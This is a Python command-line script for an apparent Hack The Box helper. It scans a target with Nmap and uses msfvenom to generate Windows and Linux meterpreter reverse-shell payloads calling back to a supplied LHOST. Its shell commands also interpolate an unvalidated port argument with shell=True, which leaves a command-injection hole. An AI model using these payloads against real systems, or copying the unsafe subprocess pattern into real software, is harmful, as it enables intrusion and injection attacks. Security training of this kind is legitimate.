#!/usr/bin/env python3
"""
HTB Helper - Command Line Interface
Provides CLI argument support for non-interactive usage.
"""

import argparse
import sys
import os
import error_handling
import nmap_payload_gen
import setup
import tools

def create_parser():
    """Create and configure argument parser."""
    parser = argparse.ArgumentParser(
        description='HTB Helper - A comprehensive tool for Hack The Box challenges',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Interactive mode (default)
  %(prog)s
  
  # Non-interactive mode with all options
  %(prog)s -n MyBox -i 10.10.10.150 -t Linux -l 10.10.14.5
  
  # Skip tool installation
  %(prog)s -n MyBox -i 10.10.10.150 --skip-tools
  
  # Run only nmap scans
  %(prog)s -n MyBox -i 10.10.10.150 --only-scan
        """
    )
    
    # Required arguments (in non-interactive mode)
    parser.add_argument('-n', '--name', 
                        help='Machine name')
    parser.add_argument('-i', '--ip', 
                        help='Target machine IP address')
    
    # Optional arguments
    parser.add_argument('-t', '--type', 
                        choices=['Windows', 'Linux', 'windows', 'linux'],
                        help='Machine type (Windows/Linux)')
    parser.add_argument('-l', '--lhost', 
                        help='Your IP address (LHOST) for payload generation')
    parser.add_argument('-p', '--lport', 
                        default='4444',
                        help='Listening port for payloads (default: 4444)')
    parser.add_argument('-H', '--handle', 
                        help='Your handle/username')
    
    # Behavioral flags
    parser.add_argument('--skip-tools', 
                        action='store_true',
                        help='Skip tool installation')
    parser.add_argument('--skip-scan', 
                        action='store_true',
                        help='Skip nmap scanning')
    parser.add_argument('--skip-payloads', 
                        action='store_true',
                        help='Skip payload generation')
    parser.add_argument('--only-scan', 
                        action='store_true',
                        help='Only run nmap scans (skip other steps)')
    parser.add_argument('--only-payloads', 
                        action='store_true',
                        help='Only generate payloads (requires --lhost)')
    
    # Interactive mode
    parser.add_argument('--interactive', '-I',
                        action='store_true',
                        help='Force interactive mode')
    
    return parser

def validate_args(args):
    """Validate command line arguments."""
    errors = []
    
    # If any required arg is provided, all should be provided (unless interactive)
    if not args.interactive:
        if args.name or args.ip:
            if not args.name:
                errors.append("Machine name (-n/--name) is required in non-interactive mode")
            if not args.ip:
                errors.append("Machine IP (-i/--ip) is required in non-interactive mode")
        
        # Validate IP format if provided
        if args.ip and not setup.validate_ip(args.ip):
            errors.append(f"Invalid IP address: {args.ip}")
        
        # Validate LHOST if provided
        if args.lhost and not setup.validate_ip(args.lhost):
            errors.append(f"Invalid LHOST IP address: {args.lhost}")
        
        # Validate machine name if provided
        if args.name and not setup.validate_machine_name(args.name):
            errors.append(f"Invalid machine name: {args.name}. Use only alphanumeric, dash, underscore")
        
        # Check for only-payloads requirements
        if args.only_payloads and not args.lhost:
            errors.append("--only-payloads requires --lhost to be specified")
    
    if errors:
        print("Error(s):", file=sys.stderr)
        for error in errors:
            print(f"  - {error}", file=sys.stderr)
        sys.exit(1)

def run_interactive():
    """Run in interactive mode (original behavior)."""
    import main
    main.main()

def run_non_interactive(args):
    """Run in non-interactive mode with provided arguments."""
    error_count = 0
    
    # Use provided values or defaults
    handle = args.handle or "htb-user"
    machine_name = args.name
    machine_ip = args.ip
    machine_type = args.type.capitalize() if args.type else None
    
    print(f"HTB Helper - Non-interactive mode")
    print(f"Machine: {machine_name}")
    print(f"IP: {machine_ip}")
    print(f"Type: {machine_type or 'Auto-detect'}")
    print()
    
    # Setup directory structure
    base_dir = setup.setup_directory_structure(machine_name)
    error_handling.loading_bar(message="Setting up directory structure")
    
    # Generate info.md file
    try:
        setup.generate_info_md(handle, machine_name, machine_ip, base_dir)
        print(f"✓ Info file created at {base_dir}/notes/info.md")
    except Exception as e:
        error_handling.log_error(e, "generate_info_md")
        error_count += 1
    
    # Install tools (unless skipped or only-payloads mode)
    if not args.skip_tools and not args.only_payloads:
        try:
            tools.install_tools(base_dir)
            error_handling.loading_bar(message="Installing tools")
            print("✓ Tools installed")
        except Exception as e:
            error_handling.log_error(e, "install_tools")
            error_count += 1
    elif args.skip_tools:
        print("⊘ Tool installation skipped")
    
    # Run scans (unless skipped or only-payloads mode)
    if not args.skip_scan and not args.only_payloads:
        # Determine machine type if not provided
        if not machine_type:
            try:
                machine_type = nmap_payload_gen.initial_nmap_scan(machine_ip, base_dir)
                error_handling.loading_bar(message="Running initial Nmap scan")
                print(f"✓ Machine type detected: {machine_type}")
            except Exception as e:
                error_handling.log_error(e, "initial_nmap_scan")
                error_count += 1
        
        # Advanced Nmap scan
        try:
            nmap_payload_gen.advanced_nmap_scan(machine_ip, machine_type, base_dir)
            error_handling.loading_bar(message="Running advanced Nmap scan")
            print("✓ Advanced Nmap scan completed")
        except Exception as e:
            error_handling.log_error(e, "advanced_nmap_scan")
            error_count += 1
    elif args.skip_scan:
        print("⊘ Scanning skipped")
    
    # Exit if only-scan mode
    if args.only_scan:
        print("\nScan-only mode: Skipping payload generation")
        print(f"\nCompleted with {error_count} error(s)")
        return error_count
    
    # Generate payloads (unless skipped)
    if not args.skip_payloads:
        if args.lhost:
            try:
                # For non-interactive payload generation, create a modified function
                payloads_dir = os.path.join(base_dir, "payloads")
                if not os.path.exists(payloads_dir):
                    os.makedirs(payloads_dir)
                
                # Generate payloads with provided LHOST and LPORT
                import subprocess
                lport = args.lport
                
                print(f"Generating payloads with LHOST={args.lhost} LPORT={lport}")
                
                if machine_type in ["Windows", "windows"]:
                    cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT={lport} -f exe > {payloads_dir}/windows_meterpreter.exe"
                    subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
                elif machine_type in ["Linux", "linux"]:
                    cmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={args.lhost} LPORT={lport} -f elf > {payloads_dir}/linux_meterpreter.elf"
                    subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
                else:
                    # Generate both
                    cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT={lport} -f exe > {payloads_dir}/windows_meterpreter.exe"
                    subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
                    cmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={args.lhost} LPORT={lport} -f elf > {payloads_dir}/linux_meterpreter.elf"
                    subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
                
                error_handling.loading_bar(message="Generating payloads")
                print(f"✓ Payloads generated in {payloads_dir}")
            except Exception as e:
                error_handling.log_error(e, "generate_payloads")
                error_count += 1
        else:
            print("⊘ Payload generation skipped (no LHOST provided)")
    
    print(f"\nAll tasks completed!")
    print(f"Working directory: {base_dir}")
    if error_count:
        print(f"⚠ {error_count} error(s) occurred. Check error_log.txt for details.")
    else:
        print("✓ No errors occurred.")
    
    return error_count

def main():
    """Main CLI entry point."""
    parser = create_parser()
    args = parser.parse_args()
    
    # Determine if we should run interactively
    is_interactive = (
        args.interactive or 
        (not args.name and not args.ip) or
        len(sys.argv) == 1
    )
    
    if is_interactive:
        run_interactive()
    else:
        validate_args(args)
        exit_code = run_non_interactive(args)
        sys.exit(0 if exit_code == 0 else 1)

if __name__ == "__main__":
    main()
